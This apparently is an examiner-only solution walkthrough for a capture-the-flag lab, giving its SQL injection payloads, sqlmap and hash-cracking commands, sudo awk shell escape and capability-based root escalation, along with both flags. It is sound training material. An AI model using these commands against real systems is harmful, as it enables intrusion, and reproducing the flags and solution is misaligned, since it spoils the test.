# m3-gauntlet — walkthrough (EXAMINER ONLY)

Level: medium. Skills: web enum, SQL injection (sqlmap), hash cracking,
two-step privesc (sudo -u pivot → Linux capability).

## 1. Enumerate
```bash
nmap -sC -sV <IP>                 # 22 ssh, 80 http
# index.php has a search form -> search.php?q=
```

## 2. SQL injection
`search.php` runs `... WHERE title LIKE '%$q%'` — injectable.
```bash
sqlmap -u "http://<IP>/search.php?q=test" -p q --batch --dbs
sqlmap -u "http://<IP>/search.php?q=test" -p q --batch -D devhub -T users --dump
```
Manual UNION also works:
```
q=%' UNION SELECT 1,username,password FROM users -- -
```
Dumped `users`:
```
mbrown : c378985d629e99a4e86213db0cd5e70d   (MD5 of "chocolate")
alice  : ...
admin  : ...
```

## 3. Crack the hash
```bash
# rockyou: gunzip -k /usr/share/wordlists/rockyou.txt.gz
hashcat -m 0 mbrown.hash /usr/share/wordlists/rockyou.txt
# or:  john --format=raw-md5 --wordlist=rockyou.txt mbrown.hash
#   mbrown : chocolate
```

## 4. Access → user
```bash
ssh mbrown@<IP>        # chocolate
cat /home/mbrown/user.txt
# FLAG{sqli_dump_crack_login}                     <-- USER FLAG
```

## 5. Privesc step 1 — pivot mbrown → svc (GTFOBins: awk)
```bash
sudo -l
#   (svc) NOPASSWD: /usr/bin/awk
sudo -u svc /usr/bin/awk 'BEGIN{system("/bin/sh")}'
# whoami -> svc
```

## 6. Privesc step 2 — svc → root (Linux capability)
```bash
getcap -r / 2>/dev/null
#   /usr/local/bin/python3cap cap_setuid=ep
/usr/local/bin/python3cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
# id -> uid=0(root)
cat /root/root.txt
# FLAG{c4p_s3tu1d_pyth0n_r00t}                    <-- ROOT FLAG
```
